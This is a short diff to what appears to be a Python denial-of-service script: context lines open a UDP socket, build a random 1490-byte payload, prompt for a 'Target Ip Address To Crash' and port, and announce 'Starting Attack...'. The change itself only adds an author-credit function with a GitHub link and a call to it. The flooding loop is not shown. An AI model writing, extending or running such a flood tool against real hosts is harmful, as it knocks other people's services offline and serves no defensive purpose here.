@@ -15,9 +15,14 @@ year = now.year
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
- 
+
 
 os.system("clear")
+
+def author():
+ print("TOOL IS CREATED BY KRISHNA PRANAV")
+ print("Github Link https://www.github.com/krishpranav")
+ print("Do Not Forget To Follow Me :)")
 
 print("""
 \033[1;31m_________                      .__       __      __      ___.          .__  __          
@@ -30,6 +35,8 @@ print("""
 
 ip = raw_input("Enter Your Target Ip Address To Crash >> ")
 port = raw_input("Enter Your Target Port >> ")
+
+author()
 
 os.system("clear")
 os.system("figlet Starting Attack...")
